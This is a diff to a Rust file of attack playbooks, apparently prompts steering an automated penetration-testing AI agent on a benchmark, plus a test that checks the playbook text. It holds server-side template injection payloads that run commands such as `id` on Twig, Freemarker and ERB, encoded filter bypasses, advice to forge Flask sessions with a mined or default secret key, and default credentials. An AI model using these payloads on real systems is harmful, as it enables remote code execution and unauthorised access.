@@ -83,8 +83,9 @@ pub const PLAYBOOKS: &[Playbook] = &[
     Playbook {
         tags: &["ssti", "template_injection", "server_side_template_injection"],
         label: "SSTI",
-        body: "SSTI playbook. 1/13 solved — usually misidentifies the engine and tries wrong \
-               payloads.\n\n\
+        body: "SSTI playbook. Live xbow partial: 7/8 addressable solved; the remaining miss is \
+               an encoded/stored Jinja surface after default-login or Flask session handling. \
+               Do not stop at visible calculator parameters.\n\n\
                Step 1 — fingerprint the engine:\n\
                - `${7*7}` → 49 ⇒ Freemarker / Mako / Velocity\n\
                - `{{7*7}}` → 49 ⇒ Jinja2 / Twig / Liquid / Nunjucks\n\
@@ -96,6 +97,15 @@ pub const PLAYBOOKS: &[Playbook] = &[
                - Twig: `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`\n\
                - Freemarker: `<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}`\n\
                - ERB: `<%= `id` %>`\n\n\
+               Step 3 — when filters block `{}`, `_`, `.`, or `[]`:\n\
+               - Retry encoded braces: `%7B%7B7*7%7D%7D`, double-encoded `%257B%257B7*7%257D%257D`, \
+                 and unicode escapes if the app decodes before rendering.\n\
+               - Test stored fields rendered later: profile name, address, notes, loan purpose, \
+                 comments, and admin-visible pages. A rejected calculator field does not clear \
+                 stored profile SSTI.\n\
+               - Flask/Jinja targets: mine or default the SECRET_KEY, forge a session only to \
+                 reach authed templates, then test every reflected/stored field with curl/form \
+                 POSTs that set a correct Content-Length.\n\n\
                Verify with deterministic output (`id` returns `uid=...`) OR interactsh callback. \
                Probe error pages — SSTI in stack traces is common in dev mode.",
     },
@@ -445,6 +455,15 @@ mod tests {
         assert!(prompt.contains("Mine usernames"));
         assert!(prompt.contains("grafana admin/admin"));
         assert!(prompt.contains("Basic Auth"));
+    }
+
+    #[test]
+    fn ssti_playbook_covers_encoded_and_stored_jinja_surfaces() {
+        let prompt = compose_playbook_prompt(&["ssti".to_string()]);
+        assert!(prompt.contains("%7B%7B7*7%7D%7D"));
+        assert!(prompt.contains("stored fields rendered later"));
+        assert!(prompt.contains("Flask/Jinja targets"));
+        assert!(prompt.contains("Content-Length"));
     }
 
     #[test]
